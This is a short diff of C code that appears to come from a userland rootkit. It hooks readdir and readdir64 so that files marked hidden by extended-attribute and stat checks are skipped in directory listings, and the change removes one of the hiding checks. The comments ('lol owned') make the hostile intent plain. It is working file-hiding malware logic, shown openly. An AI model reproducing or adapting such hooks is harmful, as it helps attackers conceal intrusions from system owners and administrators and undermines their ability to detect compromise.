@@ -29,7 +29,7 @@ struct dirent *readdir(DIR *dirp)
 
             snprintf(path, PATH_MAX, "%s/%s", directory_name, dir->d_name); // finalize the string, CHECK IF THE SHIT'S HIDDEN
         }
-    } while(dir && (hidden_xattr(path) || hidden_xstat(_STAT_VER, path, 32) || hidden_str(path)));
+    } while(dir && (hidden_xattr(path) || hidden_xstat(_STAT_VER, path, 32)));
 
     return dir; // lol owned
 }
@@ -63,7 +63,7 @@ struct dirent64 *readdir64(DIR *dirp)
 
             snprintf(path, PATH_MAX, "%s/%s", directory_name, dir->d_name);
         }
-    } while(dir && (hidden_xattr(path) || hidden_xstat(_STAT_VER, path, 32) || hidden_str(path)));
+    } while(dir && (hidden_xattr(path) || hidden_xstat(_STAT_VER, path, 32)));
 
     return dir;
 }
